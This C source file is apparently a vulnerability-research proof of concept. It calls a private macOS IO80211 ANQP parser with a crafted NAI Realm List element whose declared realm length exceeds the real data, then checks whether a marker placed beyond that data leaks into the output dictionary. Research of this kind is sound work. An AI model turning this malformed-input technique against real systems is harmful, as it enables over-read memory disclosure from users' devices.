// ANQP NAI-Realm-List DISCLOSURE demo: the u16 realm-data-field-length is not bound by the
// element's actual data extent, so CFStringCreateWithBytes reads bytes BEYOND the intended
// realm data and those bytes end up in the output dict (retrievable via CWInterface queryANQPElements).
// We place a marker just past the "real" 4-byte realm data and confirm it leaks into the output CFString.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <dlfcn.h>
#include <CoreFoundation/CoreFoundation.h>

typedef int (*anqp_fn)(const void *buf, uint32_t len, CFMutableDictionaryRef dict);

int main(void){
  void *h = dlopen("/System/Library/PrivateFrameworks/IO80211.framework/IO80211", RTLD_NOW);
  anqp_fn fn = (anqp_fn)dlsym(h, "OSX_Apple80211ANQPParseANQPData");
  if(!fn){ fprintf(stderr,"dlsym fail\n"); return 1; }

  // Intended realm data = "AAAA" (4 bytes). We declare realm-data-field-length = 0x20 (32),
  // so the parser reads 28 bytes PAST the intended 4 — into the marker we control.
  const int RDLEN = 0x20;
  int total = 7 + RDLEN + 8;
  unsigned char *buf = calloc(1, total);
  buf[0]=0x04; buf[1]=0x01;         // element id 0x0104 (NAI Realm List)
  buf[2]=0x08; buf[3]=0x00;         // EL=8 (nonzero, small -> loop does 1 realm then stops)
  buf[4]=0x00;                      // realm entry byte0
  buf[5]=RDLEN & 0xff; buf[6]=(RDLEN>>8)&0xff;   // realm-data-field-length = 0x20
  memcpy(buf+7, "AAAA", 4);         // the *intended* 4-byte realm data
  // bytes buf+11 .. represent adjacent data that should NOT be part of this realm:
  memcpy(buf+11, "LEAK_SECRET_1337_XYZ", 20);

  CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL,0,&kCFTypeDictionaryKeyCallBacks,&kCFTypeDictionaryValueCallBacks);
  uint32_t len = 7 + RDLEN;         // >=4 and >=EL(8)
  int r = fn(buf, len, dict);
  fprintf(stderr,"parser returned %d\n", r);

  CFStringRef desc = CFCopyDescription(dict);
  char out[8192]; out[0]=0;
  CFStringGetCString(desc, out, sizeof out, kCFStringEncodingUTF8);
  fprintf(stderr,"--- output dict ---\n%s\n-------------------\n", out);
  if(strstr(out, "LEAK_SECRET")){
    fprintf(stderr,"[DISCLOSURE CONFIRMED] bytes beyond the 4-byte intended realm data (\"LEAK_SECRET_...\") "
                   "leaked into the ANQP output dict -> retrievable by userspace.\n");
    return 42;
  }
  fprintf(stderr,"[NO-LEAK] marker not present in output.\n");
  return 0;
}
